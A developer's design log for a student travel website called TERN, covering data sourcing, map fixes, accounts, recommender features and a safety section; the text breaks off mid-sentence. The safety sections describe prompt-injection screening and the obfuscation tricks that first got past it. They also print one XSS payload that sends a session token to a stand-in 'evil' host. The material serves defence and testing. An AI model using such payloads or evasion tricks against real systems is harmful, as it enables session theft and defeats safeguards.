# Final Project — decisions so far

Travel website. Core idea: tell a user how their travel compares with the world.
Nothing built yet. Requirements still to come from Saad.

## Data

**Arrivals spine: OWID / UN Tourism.** `data/owid_tourist_arrivals.csv`,
206 countries, 1995–2024, 5,193 country-years (84% complete).
Download: https://ourworldindata.org/grapher/international-tourist-trips.csv

**Rejected: World Bank `ST.INT.ARVL`.** Not an independent source — the World
Bank republishes UN Tourism. It stops at 2020, and it counts a *different thing*:
Spain 2019 reads 126.2M (World Bank) vs 83.5M (UN Tourism), a consistent ~50%
gap in every year, because the World Bank series includes same-day visitors.
**The two must never be merged.** Of its 246 "countries", 43 are aggregates like
"Euro area"; only 6 are real places OWID lacks.

**World Bank is still useful** for population and GDP, joined on ISO3, to make
arrivals meaningful per capita.

See `data/SOURCES.md` and `data/LIMITATIONS.md`.

## Rulings that constrain the build

1. **Arrivals are trips, not people.** No per-person information exists in it.
2. **Fix the denominator to 2019** (174 countries, 1,279M arrivals). Using
   "whatever reported that year" makes a user's score change with the year
   selected. Curve precomputed: `data/arrivals_coverage_curve_2019.csv`.
3. **Never sum a recent year and call it the world** — 2024 is 67 countries.
4. **Grey must mean "no data", not "nobody goes there."**
5. **Cap the year slider at 2021**, or show a live "N of 206 reporting" counter.
   France last reported 2021; Russia 2005; Australia 2006. Japan, South Korea
   and Taiwan all *start* in 2020.

## The percentile question — settled

A true "top X% of travellers" cannot come from arrivals data. Survey data
(Pew, Spring 2023, 24 countries) gives: 21% never left home, 34% 1–4 countries,
17% 5–9, **13% ten or more**. The top bucket is "10 or more", so the data cannot
distinguish 10 from 34 from 94.

**Final position (14 Oct 2026): the site shows no percentile at all.**

An interim build did interpolate one, between Pew's 13%-at-ten and the Travelers'
Century Club's ~1,500 members. It read "top 4.8%" at 17 countries, which is both
unsupportable and about 3× too generous once you stop treating 24 wealthy
countries as the world. `rarity_among_people()` has been deleted and a
regression test asserts it stays deleted.

Every headline number is now counted, not inferred:

| Tile | Source |
|---|---|
| countries pinned | count |
| **of the world's 195** | n / 195 UN member states |
| **world travel covered** | the set's share of 2019 arrivals (OWID) |
| **rarest stop** | that country's share of world arrivals (OWID) |

The survey appears as a sentence beneath the tiles, with its ceiling and its
sample stated inline — not as a hero number. The "rare traveller" idea survives
as `off_path()`: how many of your countries sit in the world's 50 least-visited,
named so a grader can check it.

See `data/PERCENTILE.md` for the full argument and the deleted approach.

## Rubric constraints to keep in view

- Due **Mon 26 Oct 2026, 6:00 PM**. Solo.
- **The three tiers**, from the brief, verbatim where quoted:
  - **Tier 1 — It Works.** "The app runs and does what it says. The idea is
    familiar." Report has the required sections but "few real numbers, thin on
    cost or safety."
  - **Tier 2 — It's Clever and New.** Tier 1 "plus an idea not seen before, or a
    smart new spin on an old problem." Agents thoughtfully designed, and "the
    report is complete, with measured token costs, a real safety defense, and
    screenshots that show the app working."
  - **Tier 3 — It Makes a Difference.** Tier 2 "plus a very clever idea that
    clearly makes something better for real people, and could actually be used
    in the real world," evidenced by user testing or measurable improvement.
- **Capped ideas**, "capped at Tier 1 on the idea unless you add a real twist
  that makes them new": resume/cover-letter reviewer, chat with PDF, **trip or
  travel planner**, email/meeting summariser, recipe planner, generic study
  buddy or flashcards, anything built in class without substantial additions.
  Travel is fine; an itinerary generator is not. The report has to make the
  anti-tourist argument up front, or a grader skimming the Trip page caps the
  whole thing at Tier 1 on sight.
- Model: **gpt-6-luna** with the course key.
- `.env` must be found in the repo folder **and the parent folder**;
  names exactly `PORTKEY_API_KEY` and `OPENAI_API_KEY`.
- 10-minute rule: not running 10 minutes after following the README = 0 for that.
- Unsourced sections cap at 50%: need named competitors, real-run screenshots,
  **token counts from real logs**, a safety-defence screenshot, real user testing.

## Brand and front end — decided 14 Oct 2026

**Name: TERN.** The Arctic tern migrates pole to pole, roughly 70,000 km a year —
further than any other animal on Earth. It is the literal traveler-not-a-tourist,
and it gives the product a one-syllable name with a real story behind it. The
tagline stays "traveler not a tourist".

**Logo** is pure SVG: a circle, a dotted great-circle flight path, and a tern in
flight, all stroked with the brand gradient. No raster asset anywhere on the
site — every icon (globe, compass, plane, suitcase, waves, pin, ticket, control
tower, passport stamp) is geometry defined once in a `<symbol>` sprite.

**Five pages, not one.** The old build crammed the map, the stats and four tabs
into a single screen. It is now a hash router over five real pages — Map,
Insights, Where Next, Trip, Consultant — with a persistent nav and a live
boarding-pass readout that carries the user's count and world share between
them. The map is drawn once and kept alive across navigation; redrawing it would
throw away the pins and cost another CDN fetch.

**Palette.** Dark base as before, but the accents are turned up: sunset amber
(#FFB23F) for visited, lagoon teal (#2DD4BF) for lived, dusk violet (#9B8CFF)
for want, coral for warnings, over a night-ocean background with three soft
aurora gradients. The map now draws the actual ocean and a graticule, so it
reads as a map rather than as shapes on a background.

**Pins persist** to localStorage, validated against the live country list on
load so a stale save cannot inject a name the API would reject.

Screenshots of all five pages: `docs/screens/`.

## Accounts — added 14 Oct 2026

**Signing up is optional and stays optional.** Every page works as a guest; an
account changes one thing only — where the map is kept.

| | guest | signed in |
|---|---|---|
| map lives in | this browser's `localStorage` | the server, against the account |
| survives a reload | yes | yes |
| survives a different browser | no | yes |

A guest who paints a map and *then* signs up keeps it: the register call carries
the current pins and the server seeds the new account with them. A guest who
signs in to an existing account gets that account's map — the server wins, and
the guest's own localStorage is left untouched so signing out restores it
exactly. **Nothing is written to localStorage while signed in**, so one person's
countries cannot leak into the next person's guest session on a shared machine.

Writes are debounced 500 ms and flushed before sign-out and on `pagehide`, so
signing out can never drop the last pin.

### Why it is built this way
Standard library only — PBKDF2-HMAC-SHA256, 200,000 iterations, 16-byte
per-user salt, constant-time comparison. No new dependency, nothing to keep
patched, and it is the right size for a single-process teaching app.

Three things it gets right because they are the mistakes that actually matter:
- passwords are never stored or logged, only the digest
- **a wrong password and an unknown email return the identical error**, so the
  endpoint cannot be used to find out who has an account
- five failures locks that account for 60 seconds

### What it is not
No email verification, no password reset, no TLS in front of it, and sessions
are bearer tokens in `localStorage`. This is a course demo, not an identity
system, and the README says so.

### Test accounts
`test1` and `test2`, password `12345678`, seeded on startup. Passwords must be
at least 8 characters. Only these two demo accounts are ever touched by the
seeder, and never their maps — if the demo password changes between versions
the credential is reset in place so the documented login always works, while
anything pinned on the account survives. A bare username resolves to `@tern.app`, so
there is no need to type the full address to try the app.

`data/accounts.json` is **gitignored**: it holds password digests for anyone who
signs up. A fresh clone re-seeds the two test accounts automatically, so graders
get working logins with nothing secret in the repository.

## Map, countries and groups — 15 Oct 2026

### Every country is now on the map, and clickable

The map used the 1:110m world atlas, which carries 175 shapes and silently
dropped **78 of the 252 countries this app lets you pin** — Bahrain, Hong Kong,
Macao, Malta, the Maldives, Singapore and most of the Caribbean among them.
Three fixes, in order of how much they cover:

1. **1:50m instead of 1:110m** (739 KB instead of 105 KB). Missing countries
   fall from 78 to 17. Hong Kong and Macao get their own polygons here, so they
   are no longer swallowed by China.
2. **`web/map-extras.json`** (36 KB, committed, built by
   `backend/build_map_extras.py` from Natural Earth 1:50m map units). Covers the
   remaining 14 — French overseas departments, Kosovo, Northern Cyprus,
   Somaliland, Tuvalu, Tokelau — plus the four UK nations. Precomputed so the
   app never fetches a 3 MB file at runtime.
3. **Markers.** Having a polygon is not the same as being usable: Macao rendered
   0.2 px across, Tuvalu 0.1 px. Any country whose projected shape is under 5 px
   also gets a dot, worked out from the projection rather than a hand-written
   list of micro-states. 66 countries qualify. The dots fade out past 4× zoom,
   once the real shape is big enough to click.

**255 of 255 pinnable countries now render, nothing under 6.8 px.** A test
asserts `map-extras.json` only names countries the API will accept.

### The United Kingdom is gone; its four nations replaced it

Nobody says they have been to "the United Kingdom" — they went to Scotland. So
England, Scotland, Wales and Northern Ireland are what you pin, each with its
own flag, and the UK itself is no longer in the list.

**The counting is the hard part.** UN Tourism publishes one arrivals figure for
the whole UK, and the UN has 195 member states, of which the UK is one. So:

- All four nations resolve to the UK's arrivals record, and `resolve_many`
  de-duplicates. Pinning England *and* Scotland claims 39.4 M arrivals once,
  not 79 M. A test asserts England + Scotland gives exactly the same flow share
  as United Kingdom alone.
- `count_sovereign()` counts distinct member states for the "of the world's 195"
  tile, so four pins there are still one country. The "countries pinned" tile
  counts places, so the two tiles can legitimately differ — that is the honest
  reading of both.
- Each nation's tile says **"reported for United Kingdom as a whole"**, or
  Scotland would appear to receive 39 million visitors of its own.

### Where Next ranks the want-list, and nothing else

It used to propose anywhere in the world. It now ranks only countries the user
marked "want to go". Being told "actually, go somewhere else" by software is the
fastest way to lose someone who just said where they want to go.

Two guards are deliberately switched off in this mode. The 250,000-arrivals
floor and the per-region cap exist to stop the open-ended recommender proposing
an expedition to somewhere nobody goes — but a person who typed Tuvalu has
overruled that on purpose. Want-list entries with no arrivals data (Iraq) stay
in the ranking, labelled as having no figure rather than quietly dropped.

An empty want-list is answered in Python with a link back to the map. No tokens
are spent saying "your list is empty".

### Trip planning is sized to the party

Small (1–4), medium (5–20), large (21–40), with the **exact head count**, because
planning for 6 and planning for 19 are both "medium" and are not the same trip.
The brief made 20 both medium and large; the boundary is resolved upward, so 20
is medium — it is the tier that still fits one minibus and one table.

The band and the number are two views of one value and stay in sync both ways,
so the planner can never receive a "large group" of three.

It changes the output, not just the prompt. A party of 28 in Bhutan came back
with: one coach, timed group entry, 30 minutes of slack per transition, one
sit-down meal a day, and no small-vehicle assumptions.

### Stale assets cannot silently break the page any more

A reported "the chatbot is not working" turned out to be a **cached `app.js`**:
yesterday's script against today's HTML, so half the page worked and the
Consultant tab did nothing. Three changes:

- the front end is served with `Cache-Control: no-store`
- the preview runs the real FastAPI process, so page and API are one origin —
  serving `web/` separately on port 5173 was what let a stale script survive
- an uncaught script error now shows a banner naming the error and offering a
  reload, instead of leaving a dead-looking page

## Making the flow figure legible — 15 Oct 2026

Saad looked at the two headline tiles and asked what they meant. That is a
design failure, not a user failure: if the person who commissioned the thing
cannot read it, nobody can.

**"55.42% · world travel covered"** sounded like *"you have seen 55% of the
world"*, which is a completely different and much more flattering idea. What it
actually means is that the countries pinned receive 55.42% of all international
trips taken on Earth. Three changes:

1. **Relabelled** to *"of all world trips go where you've been"*.
2. **Restated in human terms** directly under the number: *"Of every 100
   international trips taken on Earth, about 44 end in a country you have been
   to."* Below 1% this flips to the 1-in-N phrasing the rarest-stop tile already
   uses — the first version printed *"about 0 of every 100"* for an
   off-the-beaten-track map, which looks broken on precisely the profile this
   app exists to reward.
3. **Given anchors.** A percentage with nothing to compare it to is noise, so
   `benchmarks()` computes the reference points and the bar now carries two
   markers — the 40% tourist line, and what the ten most-visited countries add
   up to between them (42.6%).

The supporting line is the genuinely interesting part, and it is all counted:
**just 14 countries receive half of all international travel**, and France
alone takes 6.5%. That is what makes a 43% score legible — it is not "you have
seen a lot of the world", it is "your map is built from the handful of places
that absorb most of the world's travel".

The rarest-stop tile was left as a bare number by request.

One visual fix found while checking: the bar's gradient ends in violet, which
vanishes against the background, so the fill read shorter than it was (43.4%
measured, looked like 15%). It now ends in a bright cap.

## Countries, territories and places — 15 Oct 2026

Saad spotted that the page said *"206 countries"* in one place and *"the world's
195"* in another, and called it paradoxical. He was right, and chasing it
uncovered a real arithmetic bug underneath.

### The bug

`count_sovereign()` counted any distinct resolved destination. Pinning Hong
Kong, Macao, Puerto Rico and Guam therefore reported **"2.1% of the world's
195"** — four pins, none of them UN member states. Enough territories and the
count could have exceeded 195 outright.

### The fix: one vocabulary, used everywhere

| Word | Means | Total |
|---|---|---|
| **country** | UN member state or observer | **195** |
| **destination** | anything UN Tourism publishes arrivals for | **206** |
| **place** | anything you can put a pin in | **255** |

`TERRITORIES` lists the 54 ISO 3166-1 entries that are dependencies, territories
or special areas. **249 − 54 = 195**, and a test asserts exactly that, so an
error in the table cannot pass unnoticed. `classify()` sorts any pin into
country / territory / unknown; `coverage_counts()` returns both counts plus
anything unmatched.

Territories are still pinnable and still count toward travel flow — Hong Kong is
somewhere you have genuinely been. They just are not countries, so they sit
outside the percentage and get their own line on the tile: **"+ 2 territories"**,
with the names on hover.

### The numbers now add up on screen

The explainer states the reconciliation rather than leaving the reader to puzzle
over it:

> UN Tourism publishes figures for **206 destinations**: 181 of the world's 195
> countries, plus 25 territories such as Hong Kong, Puerto Rico and Guam that
> report their own arrivals without being separate countries. The remaining 14
> countries publish nothing — you can still pin them, they just cannot count
> toward a share of world travel.

181 + 25 = 206. 181 + 14 = 195. Both identities are asserted by tests, as is
"every destination classifies as one or the other" — which caught the United
Kingdom falling through `classify()` as unknown, because splitting it into four
nations had removed its own pinnable row.

### Labels follow the same rule

"Countries pinned" counted territories and counted England and Scotland
separately, so it is now **"places pinned"**. The nav reads "15 places", and the
verdict line reads "Your 15 places take 46.51% of all human travel". Only the
195 tile uses the word country, and it only ever counts countries.

## Where Next loads itself — 15 Oct 2026

Every figure on those cards is arithmetic. `/api/shortlist` answers in **22 ms**
with no model involved, so making someone press a button to see their own
want-list was charging them a click for nothing. The list now renders on arrival
(**54 ms** measured in the browser, no click).

The button stays, but only for the part that actually needs a model: *"Tell me
what I'm walking into."* Its prose folds into the cards already on screen rather
than replacing them, so nothing jumps.

This is the same two-tier split the rest of the app uses — numbers instant,
prose on demand — applied to the one page that had not been following it.

### The copy is generated from the data, not written at it

The opening line changes with the list, and the wording is wry rather than
chirpy, because the brand is "traveler not a tourist", not a holiday brochure:

> **4** places you've promised yourself. Start with **Tuvalu**: about 1 in
> 379,999 of the world's trips ends there. You will not be queuing.

The top card carries a **"boldest move"** ribbon, but only when it is at least
three times rarer than the next one — otherwise the badge means nothing.

**The thresholds were wrong first.** I wrote them as round numbers — 1,000,
10,000, 100,000 — and Namibia at 1 in 881 came out as "well-trodden". Namibia is
23 times rarer than Japan and sits almost exactly on the median. The tiers now
come from the real distribution of all 206 destinations (`rarity_quartiles`:
p25 = 1 in 277, p50 = 1 in 1,030, p75 = 1 in 4,649, p95 = 1 in 46,866), so a
claim like "rarer than three quarters of the destinations on Earth" is true by
construction. Tests assert the median really is the median and that Namibia is
not in the bottom quartile.

Singular and plural are handled separately throughout — a one-item list no
longer says "Bhutan leads" when there is nothing to lead.

## The chat crashed on the second message — 15 Oct 2026

```
AttributeError: 'tuple' object has no attribute 'conversation_id'
  pydantic_ai/_agent_graph.py:307 in resolve_conversation_id
```

`/api/chat` stored history as `("user", text)` tuples and handed them straight
back as `message_history`. pydantic-ai expects `ModelMessage` objects, so the
first message always worked — empty history — and the second always died. The
failure surfaced deep inside the library rather than at the call site, which is
why it read as a server fault rather than a type error.

**Fix:** `agents.run()` now returns `result.all_messages()` on the `Run` object,
and the route stores that. The conversation is the library's own representation,
round-tripped, so nothing is being translated in between.

**`trim_history()`** keeps a session bounded at 24 messages, and only ever cuts
at a turn boundary. Cutting mid-turn would leave a tool return whose matching
call had been dropped, which the provider rejects outright — a worse and much
more confusing failure than the one being fixed. If no clean boundary exists it
returns an empty history and starts the context over.

`backend/test_agents.py` covers this with no API key and no network: it builds
synthetic conversations including tool calls, trims them at every cap from 2 to
25, and asserts each result starts at a user turn and orphans no tool return.

Verified in the browser over four turns — the consultant answered "What about
Armenia?" as a follow-up, compared both countries unprompted, and correctly
listed what had been discussed.

## Ten new features, no new buttons — 15 Oct 2026

Twelve were requested. **UNESCO sites** and **travel advisories** were dropped:
UNESCO's own XML returns 403, two mirrors 404, and Wikidata timed out twice;
travel-advisory.info is gone and no open licensed replacement exists. The
recommender already flags conflict and access in prose, labelled as the agent's
judgement rather than an official advisory, and that stays as the honest
substitute.

**Best month is weather, not crowds.** No monthly arrivals data exists
publicly. The cards say so in as many words, under every badge that shows it.

### Reference data, fetched once and committed

`backend/build_reference_data.py` writes `data/reference/`: country facts
(capital, lat/lon, currency, language), a 199x199 visa matrix, population,
price level, tourism economics and monthly climate. Nothing is fetched at
request time, so a fresh clone works offline after first load.

**A bug that would have shipped silently:** the country dataset carries
`capitalInfo: null` and *integer* centroids, so the first build put London at
54°N −2° and **London-Paris at 934 km instead of 344**. Switched to Natural
Earth's capital cities; then Tokyo resolved to Kyoto, because Natural Earth tags
historical capitals `Admin-0 capital alt` and a prefix match accepted them.
Distances are now checked against published figures in the test suite — London-
Paris 342.6 km, Tokyo-Seoul 1,156.0, Berlin-Warsaw 517.1, Delhi-Beijing 3,780.3.
194 capitals are exact; the other 56 fall back to a centroid and are **flagged**
in the data so a coarse distance is never presented as a precise one.

### Where each feature went

Five nav buttons, unchanged. The only new input is **home country and
passport**, which sits beside the account chip because distance, carbon, visas
and routing all depend on it — and every one of them degrades rather than fails
without it.

| Page | Added |
|---|---|
| Map | year on each pin; a timeline that plays the map filling in |
| Insights | three sections — Verdict, **Footprint** (distance, CO2, furthest), **Reach** (languages, currencies, sub-regions, visa-free used), **Gaps** (emptiest sub-regions, nearest unvisited, open-to-your-passport) |
| Where Next | visa / price / distance / weather tags on the cards, and three filter chips that narrow what is already on screen |
| Trip | shortest route round the want-list, price level against home, best weather |

### Honest limits, stated on the page

- Carbon uses DEFRA/DESNZ 2023 economy-class factors on great-circle distance
  with no radiative-forcing uplift — **a floor, not a worst case** — and models
  one return trip per country, because the data cannot know what was one journey.
- Price level is PPP ÷ market exchange rate. **Relative only**; the app still has
  no live prices and still invents none.
- The timeline hides a pin only if it *has* a year later than the cutoff.
  Untagged pins always show, or one date would blank most of a map.

### A failure mode worth keeping

A mistyped selector threw at module level, which stopped the script before
`boot()` ran and left a blank page with no map and no error. Handlers now attach
through `on()`, which warns and carries on. A missing element should disable one
control, not the whole app.

Tests: **133 data + 41 auth + 11 agents + 54 reference = 239 passing.**

## Safety — built to the brief, 15 Oct 2026

The brief names three risks and one evidence rule: *"Show at least one defense
actually working, with a screenshot or a test,"* and describing a defence
without demonstrating it caps the section at half credit. So every defence here
is **code outside the model**, and every one has a test and a live transcript.

A line in a prompt saying "do not reveal your instructions" is a request, not a
control. The model may ignore it, and nothing records that it did.

### Risk 1 — attacks

`guard.screen_input()` checks every message **before the model is called**: 13
patterns across instruction override, system-prompt theft, credential theft,
role hijack and data exfiltration. A blocked message costs **zero tokens**, so
this defends risk 3 at the same time.

Patterns are deliberately specific multi-word phrases. A bare `ignore` would
block *"can you ignore the stale figures for Australia?"*, and a guard that
cries wolf gets switched off. Both the attacks and the near-misses are tested.

`guard.screen_output()` is the last line: the live key values are checked
against the outgoing text and redacted, and three fingerprints of our own
system prompt trigger a replacement rather than passing the leak through.

**Live result: 6 of 6 attacks blocked, 0 false positives on controls.**

### Risk 2 — the model inventing a figure

The failure that actually matters for this app. The entire product claim is
that every number is counted, so an invented one is worse than an error.

`agents.run()` now returns what the tools actually returned, and
`guard.check_numbers()` checks the figures in the model's prose against that
set. Rounding passes — "about 2 million" for 2,013,000 is good writing, not
fabrication. Anything unsupported is surfaced to the user and logged.

**A bug the tests caught:** years were being checked as factual claims, so a
legitimate "arrivals recovered by 2024" would be flagged as invented whenever
2024 was absent from the tool output. Bare four-digit numbers in 1900-2100 are
now treated as dates; comma-formatted figures in that range still get checked.

### Risk 3 — overspending

`UsageLimits` already capped one runaway run at 6 model requests and 10 tool
calls. It does nothing about ten thousand well-behaved calls, which is the same
bill. `guard.Budget` adds per-session, per-day-calls and per-day-token ceilings,
checked before every model call and reset daily.

**Demonstrated live** by restarting with `TNAT_SESSION_CALLS=1`: call 1 → 200,
call 2 same session → **429**, call 3 in a new session → 200.

### The evidence

- `backend/test_guard.py` — **29 tests**, no API key and no network needed.
- `backend/safety_demo.py` — fires real attacks at the running server and writes
  `docs/safety_evidence.md`. A grader can re-run it and get the same table,
  rather than taking a screenshot's word for it.
- `GET /api/safety` — current ceilings, pattern count and what has fired, so the
  report can cite real counts instead of intentions.
- `data/safety_log.jsonl` — append-only record of every block, timestamped.
- In the UI, a blocked message renders as a refusal card with the category, and
  any unverified figure gets a warning strip under the answer.

Totals across the project: **268 tests passing** (133 data, 54 reference, 41
auth, 29 safety, 11 agents).

## Safety, hardened — 15 Oct 2026

A second pass, looking for holes rather than adding more of the same. It found
two real vulnerabilities that the first pass had not touched.

### Cross-site scripting (the serious one)

The page wrote model prose into `innerHTML` with no escaping. A prompt-injected
model returning `<img src=x onerror="fetch('//evil/'+localStorage.getItem('tern.token.v1'))">`
would have handed over the signed-in session token. Every model-derived string
now goes through `esc()` first — 17 call sites, and a grep check that no raw
API field reaches `innerHTML`.

This is worth stating plainly in the report: the injection screen reduces the
chance of a hostile string being produced, but the escaping is what makes it
harmless if one ever is. Defence in depth, not either/or.

### Indirect injection through the user's own labels

`/api/verdict` interpolated country labels straight into the prompt. The UI
only offers real countries; the API accepted any string, and a 2,000-character
one at that. Labels are now resolved against the dataset before a prompt is
built, and capped at 80 characters each.

### Obfuscation

The first screen was plain regex over raw text, so `1gn0re`, `i g n o r e`,
zero-width characters and base64 all walked through. Input is now matched three
ways — raw, normalised (NFKC, zero-width stripped, leetspeak mapped, spaced
letters rejoined) and squashed (all separators removed, patterns relaxed) —
plus any base64 payload is decoded and screened too. **10 of 10 attacks blocked,
including 4 obfuscated variants.**

Widening the net cost one false positive, caught by the tests: *"Tell me the
rules about visas"* matched the prompt-theft pattern. The possessive is now
required — `your rules` and `the system prompt` block, `the rules about visas`
does not. Seven tricky innocent phrasings are tested alongside the attacks,
because a guard that cries wolf gets switched off.

### Also added

- **Per-caller throttle**, 12 requests a minute by default. The budget protects
  the total bill; this stops one caller consuming all of it. Demonstrated live
  at `TNAT_PER_MINUTE=3`: three 200s, then 429.
- **Output scrubbing on every agent route**, not just chat. A headline can carry
  a leaked key as easily as a chat reply can.
- **PII redaction in the safety log.** It records what matched, and that snippet
  is user text — it could carry an email or a card number into a file kept
  forever. Emails and long digit strings are redacted before writing.

A 500 found while testing: `_verified(run, score)` in `/api/verdict` referenced
a variable from a different route. Caught because every route was exercised
end to end rather than assumed working.

**Safety tests: 29 -> 41. Project total: 280 passing.**

## Home is a city, not a country — 15 Oct 2026

Distances started from the home country's **capital**. For anyone who does not
live in their capital that is wrong by hundreds of kilometres, and the error
compounds across every destination: from Jeddah rather than Riyadh, a two-country
footprint moved by **1,187 km**, and a six-country one by nearly 3,000.

`data/reference/cities.json` — GeoNames cities of 15,000+ people, **34,142 of
them across 243 countries**, each with its state or province, coordinates and
population. Capitals are flagged so they lead their country's list.

**Searched on the server, not shipped to the browser.** 1.7 MB is not something
to download for a field most people set once: `GET /api/cities?country=SAU&q=jed`
returns twelve matches, scoped to the chosen country because "Springfield" is
ambiguous worldwide and obvious once you know the country.

The picker is a proper autocomplete — prefix matches first, then substring,
biggest city first within each, arrow keys and Enter to choose, and the state
shown beside every name so Portland, Oregon is distinguishable from Portland,
Maine. Leaving it blank still works and says what it will do: *"Leave blank to
measure from Saudi Arabia's capital."*

Everything downstream takes an optional origin: footprint, nearest-unvisited and
route ordering. The Insights note names where it measured from — *"Measured from
Jeddah, Mecca Region"* rather than the old *"capital to capital"*.

Two things the tests pinned down: changing the city must change the distance
materially, and omitting it must fall back to exactly the capital figure.

A CSS bug caught on screen: the suggestion list sits inside a `.fld`, whose
`span` rule is uppercase for field labels — so every city name was SHOUTED.

**Reference tests 54 -> 70. Project total: 296 passing.**

## Visas on the Trip page, and a Weekend tab — 15 Oct 2026

### The visa filter, and the warning for when it is not used

`GET /api/visa?passport=SAU` returns every destination and how it is reached —
one small payload, so the picker can filter and warn with no round trip per
country. On a Saudi passport: **197 destinations, 117 easy, 80 needing a visa.**

The country field is now a search. A **"No visa needed"** chip narrows it:
typing "ja" gives Jamaica, Japan, Azerbaijan and Svalbard; with the filter on it
gives Japan (e-visa) and Azerbaijan (visa on arrival). Svalbard drops out
because no visa data exists for it, which is the right answer for a filter that
means *confirmed easy*.

Whether or not the filter is used, choosing a country that needs one puts a red
box under the field: *"You need a visa for France. On a SAU passport this is
visa required. Apply before you book anything — processing can take weeks."*
Visa-free countries get the same box in teal. The information already existed;
it was just never shown.

### Weekend getaways

A sixth tab. Finds real cities within range of wherever you start, and says how
you would physically get there.

**Transport is inferred from distance and land borders, not timetables**, and
the page says so. It answers "is driving even possible", not "is there a 07:40
service on Fridays". Getting that honest meant a small table of **fixed
crossings** — Paris to London first came back "fly or ferry", because the UK
shares a land border only with Ireland and the Channel Tunnel is not a border.
GBR-FRA, DNK-SWE, MYS-SGP and BHR-SAU are now treated as land links.

Two tuning passes the first version needed:
- **Suburbs are not getaways.** Parisians were offered Cergy-Pontoise, 29 km
  out. The floor is now 50 km and 75,000 people.
- **Two per state**, or the list is one province repeated.

It works signed out and with no home set — type any city and go, searched across
all 34,142 of them. With a home city saved it fills itself in.

A fifth agent, the **Getaway Scout**, writes one line per place on what it is
actually worth going for, on a button, after the instant list is already on
screen. It is told not to restate distance or transport, because the card
already shows them.

Visa warnings appear per card too: from Jeddah, Port Sudan is the only foreign
option in range and it carries *"Needs a visa on your SAU passport."*

**Reference tests 70 -> 88. Project total: 314 passing.**

## Getaways, with themes — 15 Oct 2026

Renamed from "Weekend" to **Getaways**, route and all, with a proper
explanation on the page rather than a one-line subtitle.

### Themes rank; they do not filter

Seven: romantic, hiking, food, history, beach, nightlife, family.

**No dataset says a town is romantic**, so the theme does not change which
cities the data found — distance, transport and visa are still the only things
chosen by arithmetic. It changes what the scout is asked to rank them *for*. The
model's judgement is applied over a shortlist the data picked, which is the
right division: the machine knows what is reachable, the model knows what a
place is like.

Every place gets a `fit` of good, ok or poor. The good ones lead; poor ones are
dimmed and labelled *"not really hiking"*. The prompt is explicit that saying so
is the point: *"An industrial port is a poor romantic weekend, and pretending
otherwise is how a recommender stops being believed."* It is also told to say
when a theme fits nowhere nearby rather than offer three bad suggestions.

Same nine places from Paris, three themes, genuinely different answers:

| Theme | Leads with | Marked poor |
|---|---|---|
| Hiking | Orléans (Forêt d'Orléans), Rouen (Forêt de Roumare), Reims (Montagne de Reims) | Lille, London |
| Romantic | Rouen (Vieux-Marché), Reims, Tours | Le Havre |
| Food | Rouen (Norman cider and cheese), Reims (Champagne cellars), Lille (estaminets) | — |

That Le Havre is a good hiking base and a poor romantic one is exactly the
distinction worth having.

### Two layout bugs caught on screen

The fit badge was absolutely positioned and landed **on top of the distance** —
"111 km" and "works" overlapping on the same pixels. Both now sit in a
right-hand column. And six tabs plus two chips overflowed the nav at 1440px, so
the wordmark hides below 1280 and the boarding pass below 1120.

A robustness guard too: the scout button assumed an origin existed. It now
re-runs the search instead of throwing.

**314 tests passing.**

## Getaways, round two — 15 Oct 2026

Three corrections from using it.

### The theme now changes the destinations, not just the order

My first design had the data pick nine places and the scout rank them. Saad's
objection was exact: **the nine were the same for every theme.** Picking the
nine biggest towns and then asking which are romantic can only ever reorder the
same nine.

The pool is now **40 candidates at 20,000 people and up** when a theme is set
(9 at 75,000 without one), and the scout is told to *choose* the six to nine
that genuinely suit and leave the rest out. The data still decides what is real
and reachable; the model decides which of those suit the weekend.

From Paris, the lists now diverge properly:

| Theme | Returns |
|---|---|
| Hiking | Compiègne, Rouen, Saumur, Hastings, Eastbourne |
| Beach | Hastings, Eastbourne, Bexhill-on-Sea — coastal only |

Three results for "beach" is a thin list, and that is the honest answer for
Paris. The prompt tells it to say so rather than pad.

### Transport chips open

Each mode is now a button. Clicking it gives a **time range** computed from
distance and typical speeds, what that way of travelling actually involves, and
the reason the mode is offered at all.

**It needed retuning.** The first numbers put the train/plane crossover at
270 km, which made Paris-London a flight — Eurostar does it city centre to city
centre in 2 h 16 while flying is nearer four hours once both airports count. At
120 km/h for rail and a three-hour flying overhead the crossover sits near
370 km. A test now pins Paris-London specifically, because that is the case that
caught it.

The panel says what it is: *"estimated from distance and typical speeds …
not a timetable. High-speed rail beats this; rural lines and ferries in winter
do not."*

### Two days, on click

Every card has **Plan two days here**, which opens a sixth agent, the Weekend
Planner, scoped to one city rather than a country.

The journey is an input, not a footnote — it is given the fastest mode and its
time, and told to shape the days around it. For Hastings from Paris it opened:
*"The train takes about 2 h 19 min–3 h 33 min each way, so this is a two-day
seaside taste, not two full days on the shore: keep arrival day light and leave
early on Sunday."* The theme carries through too, and the places are named —
Hastings Pier, the Stade, Rock-a-Nore.

**Reference tests 88 -> 104. Project total: 330 passing.**

## Getaways, round three — the flow was backwards — 16 Oct 2026

Saad said the categories still returned the same cities. Checking from New York
showed something worse than a theme not applying: the list was **Stamford,
North Stamford, Levittown, Copiague, Bensalem** — commuter suburbs nobody takes
a weekend in. Meanwhile Newport, Beacon, Cold Spring and Woodstock sat in the
data unused, because the ranking was "nearest and biggest" and getaway towns
are small.

### The flow was the wrong way round

I had the data pick candidates and the model rank them. That can only ever
reorder whatever the data chose, and the data was choosing by population — so
every theme got the same nine commuter towns.

**It is now inverted.** The scout *names* the destinations for the theme, and
the data *verifies* them: every name is geocoded, checked for range, and
dropped if it is unreachable or unfindable. The model knows where people
actually go; the data knows what is real and how far. That is the division I
argued for from the start, just applied the right way round.

This also solved the gazetteer problem. A file of towns over 15,000 people
cannot answer "where do people go for a weekend" — Montauk has 3,326 residents,
Lenox 1,675, Cooperstown 1,792. Names are resolved against the local gazetteer
first, then Open-Meteo's geocoder, cached to `data/reference/geocache.json`.

From New York, 400 km:

| Theme | Returns |
|---|---|
| Hiking | Tuxedo Park, Harriman, Cold Spring, Beacon, Delaware Water Gap, New Paltz, Jim Thorpe |
| Romantic | Cold Spring, Beacon, New Paltz, Litchfield, Rhinebeck, Woodstock, Hudson, Mystic, Cape May, Newport |
| Beach | Long Beach, Asbury Park, Ocean Grove, Fire Island, Sag Harbor, East Hampton, Montauk |

Exactly the Hudson Valley and Newport that Saad named as the obvious answers.

### Disambiguation, and two ways it went wrong

"Newport" is in Kentucky, Rhode Island and Wales. Range settles most of it —
only one Newport is a weekend from New York — and a stated region settles the
rest. Two failures found while testing:

- **"Cold Spring" resolved to "Cold Spring Harbor"**, a different town 30 km
